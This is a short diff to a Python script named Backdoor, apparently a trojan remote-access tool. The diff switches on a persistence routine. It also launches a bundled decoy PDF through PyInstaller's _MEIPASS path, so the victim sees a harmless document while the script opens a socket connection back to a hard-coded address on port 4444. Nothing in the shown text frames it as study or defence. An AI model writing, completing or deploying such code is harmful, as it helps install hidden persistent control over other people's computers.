@@ -9,7 +9,7 @@ import shutil
 
 class Backdoor:
     def __init__(self, ip, port):
-        #self.become_persistent()
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
@@ -73,8 +73,8 @@ class Backdoor:
 
 
 if __name__ == '__main__':
-    #file_name = sys.MEIPASS + "\sample.pdf"
-    #subprocess.popen(file_name, shell=True)
+    file_name = sys._MEIPASS + "\sample.pdf"
+    subprocess.Popen(file_name, shell=True)
 
     try:
         my_backdoor = Backdoor("192.168.152.128", 4444)
